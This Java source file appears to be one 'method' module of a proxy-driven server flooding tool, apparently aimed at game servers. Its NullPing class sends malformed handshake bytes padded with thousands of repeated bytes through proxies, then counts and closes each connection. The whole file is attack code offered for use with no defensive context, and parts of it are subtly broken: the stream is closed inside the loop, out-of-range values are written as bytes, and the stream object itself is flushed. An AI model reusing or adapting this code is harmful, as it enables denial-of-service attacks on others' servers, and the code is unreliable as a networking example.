package dev.xdmeow.core.methods.impl;

import java.io.IOException;

import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class NullPing implements IMethod {

        final int a = Integer.parseInt(System.getProperty("len", "25555"));
    
        public void accept(Channel channel, Proxy proxy) {
            ByteBuf b = Unpooled.buffer();
            
            ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
            
            try {
                bbbb.write(15);
                bbbb.write(0);
                bbbb.write(99);
                bbbb.write(453);
                bbbb.write(457);
                bbbb.write(1);
                for (int i = 0; i < this.a; ++i) {
                    bbbb.write(1);
                    bbbb.write(0);
                    bbbb.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            
            channel.writeAndFlush(b);
            
            channel.writeAndFlush(bbbb);
            
            NettyBootstrap.currentConnections++;
            NettyBootstrap.totalConnections++;

            channel.close();
        }
    }
